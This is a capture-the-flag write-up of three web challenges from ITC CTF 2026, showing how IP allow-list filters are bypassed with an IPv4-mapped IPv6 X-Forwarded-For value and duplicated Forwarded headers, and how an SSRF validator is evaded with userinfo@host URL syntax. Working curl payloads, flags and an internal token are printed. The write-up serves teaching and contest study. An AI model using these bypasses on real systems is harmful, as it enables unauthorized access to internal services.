Three Parsers Walk Into /admin

Challenge author: Ayoub Touati — Writeup by Samir Djili — 2nd place, ITC CTF 2026 writeup contest

Author's note: I designed and built this trilogy of web challenges for ITC CTF 2026 in Blida, Algeria. Each challenge explores a different parser differential — the same class of bug repeated in three different contexts. This writeup by Samir Djili earned 2nd place in the CTF's writeup contest. I'm showcasing it here because it's an excellent breakdown of the intended solutions.

This is a trilogy of web challenges I authored for ITC CTF 2026, held in Blida, Algeria. The three challenges — The Jump, Filtered, and Anabasis — each explore parser differential bugs in proxy header handling and URL validation. The common thread: the security layer and the application disagree on the value they are handling.

The writeup below was written by Samir Djili, who solved all three challenges and earned 2nd place in the writeup contest.

1. The Jump

Target: https://the-jump.onrender.com/

The homepage tells us the challenge is location-sensitive. The /admin console returns 403:

HTTP/1.1 403 Forbidden

The Operations Console is available to staff on the corporate network only.

The app does not care who I am, it cares where it thinks I am coming from. The first primitive to test is X-Forwarded-For.

The obvious private IPs failed — 10.0.0.1 and 127.0.0.1 both got caught by a filter. But blocking strings is not the same as blocking addresses.

IPv4 over IPv6

IPv6 has an IPv4-mapped representation: ::ffff:x.x.x.x. For 10.0.0.1:

0a 00 00 01  →  0a00:0001  →  a00:1

So: ::ffff:a00:1

The filter sees text that does not look like 10.0.0.1. The application IP parser sees an IPv4-mapped address that lands in the internal range.

curl -sS \
  -H 'X-Forwarded-For: ::ffff:a00:1' \
  'https://the-jump.onrender.com/admin' | grep -o 'itc{[^}]*}'

itc{3asy_st4art_duhewfi}

2. Filtered

Target: https://filtered-3rwy.onrender.com/

The second challenge patched the X-Forwarded-For trick. The Forwarded header (RFC 7239) is the next suspect.

A direct Forwarded: for=::ffff:a00:1 was blocked. The fix: use two physical Forwarded headers.

Forwarded: proto=http;by=203.0.113.43
Forwarded: for=::ffff:a00:1

The filter checks the first header (no for=, passes). The app extracts the for= from the second one. Order-sensitive parser differential.

curl -sS \
  -H 'Forwarded: proto=http;by=203.0.113.43' \
  -H 'Forwarded: for=::ffff:a00:1' \
  'https://filtered-3rwy.onrender.com/admin' | grep -o 'itc{[^}]*}'

itc{4_h4ard3r_f1lt3r_f0r_th1s_d4nc3}

3. Anabasis

Target: https://throughfall-anabasis.onrender.com/

A URL preview service with SSRF potential. The /status endpoint reveals an internal metadata service at 127.0.0.1:8081.

Direct access is blocked. The trick: the userinfo@host URL syntax.

http://any@127.0.0.1:8081/metadata

A naive validator splits at :// and :, approves any as the host. The real HTTP client parses the URL grammar correctly and fetches from 127.0.0.1.

Step 1: read metadata

curl -sS \
  'https://throughfall-anabasis.onrender.com/preview?url=http://any@127.0.0.1:8081/metadata'

{
  "body":"{\"note\":\"present this token to /admin/flag as ?token=\",\"token\":\"b48f5a9ce22698e88f5d132e82afa4e3\"}",
  "status":200
}

Step 2: use the token

curl -sS \
  'https://throughfall-anabasis.onrender.com/preview?url=http://any@127.0.0.1:8081/admin/flag?token=b48f5a9ce22698e88f5d132e82afa4e3'

{
  "body": "{\"flag\":\"itc{4_c0v3r_f0r_4_h1gh3r_f0rm}\"}",
  "status": 200
}

Takeaway

The three solves all come down to the same mistake: the security layer and the application did not agree on the value they were handling.

  • Challenge 1: the filter blocked obvious private IPv4 strings, while the app accepted an IPv4-mapped IPv6 address
  • Challenge 2: the policy check and the app disagreed on repeated Forwarded headers
  • Challenge 3: the URL validator and the HTTP client disagreed on where the host actually was

That progression is what made the set work. Each challenge was compact, but the solve was never just "reuse the last trick". It kept forcing the same question in a slightly different place: what exactly got parsed, and who used the parsed result?
